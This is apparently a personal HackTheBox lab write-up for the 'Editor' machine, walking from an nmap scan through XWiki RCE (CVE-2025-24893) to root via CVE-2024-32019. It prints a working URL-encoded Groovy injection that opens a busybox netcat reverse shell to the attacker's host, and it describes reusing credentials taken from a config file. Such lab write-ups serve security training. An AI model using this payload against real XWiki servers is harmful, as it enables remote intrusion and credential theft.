---
title: "Editor"
date: 2025-08-26 15:40:21 +0800
categories: [HackTheBox,redteam]
tags: [Easy , Linux]
description: "Linux machine"
image:
   path: /assets/img/posts/htb/editor/editor-cover.png
   alt: "Editor"
---

### Machine info
**Link : [Editor](https://app.hackthebox.com/machines/Editor?tab=play_machine)**

**Description : Linux machine**

**Difficulty : Easy**


1. First run with nmap scan 
```bash
nmap -sS 10.10.11.80
```

2. the result
![Editor screenshot 1](/assets/img/posts/htb/editor/editor-1.png)

3. lets try access on port 8080 on browser . 
4.  
![Editor screenshot 2](/assets/img/posts/htb/editor/editor-2.png)
5.  it is a xwiki lets find the version 
![Editor screenshot 3](/assets/img/posts/htb/editor/editor-3.png)

It is debian 15.10.8 lets try search for the related cve and poc . 

6. yup i found it https://www.offsec.com/blog/cve-2025-24893/ 
![Editor screenshot 4](/assets/img/posts/htb/editor/editor-4.png)

7. Lets go the poc github page . https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py


8. let us run the payload . 
![Editor screenshot 5](/assets/img/posts/htb/editor/editor-5.png)


9. it is working let us have a look on the script . 
![Editor screenshot 6](/assets/img/posts/htb/editor/editor-6.png)
based on the result it cat /etc/passwd thus this is the main command let us replace it with the reverse shell command .  i will be using reverse shell generator . https://www.revshells.com/ 
```python
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22busybox%20nc%2010.10.16.26%206000%20-e%20sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```


10.  First do a listener and send the payload to the website and have shell on my machine . 

on my machine 
```bash
nc -lvnp 6000
```

11. run the payload again 
![Editor screenshot 7](/assets/img/posts/htb/editor/editor-7.png)
yup we get the reverse shell 
![Editor screenshot 8](/assets/img/posts/htb/editor/editor-8.png)

12. Then i start enumerate , i found smtg on this directory 
```
/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF
```

![Editor screenshot 9](/assets/img/posts/htb/editor/editor-9.png)
lets look hibernate.cfg.xml . 

13. looks like the first is the password , lets try find the user rmb the /etc/passwd . 
![Editor screenshot 10](/assets/img/posts/htb/editor/editor-10.png)

14. ok i found oliver , lets us ssh 
![Editor screenshot 11](/assets/img/posts/htb/editor/editor-11.png)

15. yeah succesfully and cat the user.txt . 
![Editor screenshot 12](/assets/img/posts/htb/editor/editor-12.png)

16. i been stuck for the priviledge esc for long time , until sifu zhenda recommend linpeas . linpeas basically will serach for any possible priviledge esc on linux . 
17. But we need to pass the linpeas.sh to the target machine , thr is many way for me i host a http server and use wget and the victim machine and run it . 
18. i found this , look like it internal hosting some service , let us try access it using port forwarding with ssh . 
![Editor screenshot 13](/assets/img/posts/htb/editor/editor-13.png)

19. `ssh -L 33060:127.0.0.1:33060 oliver@10.10.11.80 
![Editor screenshot 14](/assets/img/posts/htb/editor/editor-14.png)

20. thr is nothing special until port 19999 .
![Editor screenshot 15](/assets/img/posts/htb/editor/editor-15.png)

21. Let do the samething find the version then look for cve and poc .

![Editor screenshot 16](/assets/img/posts/htb/editor/editor-16.png)

22. i found this [
](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://nvd.nist.gov/vuln/detail/CVE-2024-32019&ved=2ahUKEwiQ4PW86amPAxXBamwGHTLLAwoQFnoECBsQAQ&usg=AOvVaw272b7CDNoH99WkoTzYVeTo) it is related to cve 2024-32019

23. we can use this website https://sploitus.com/?query=CVE-2024-32019#exploits to serach for poc . 
24. just follow the step 
25. ndsudo is not in the path so u can either enter the directoy or ecport to the path , if no u will get an error 
![Editor screenshot 17](/assets/img/posts/htb/editor/editor-17.png)

26. now we get the root 
![Editor screenshot 18](/assets/img/posts/htb/editor/editor-18.png)

![Editor screenshot 19](/assets/img/posts/htb/editor/editor-result.png)

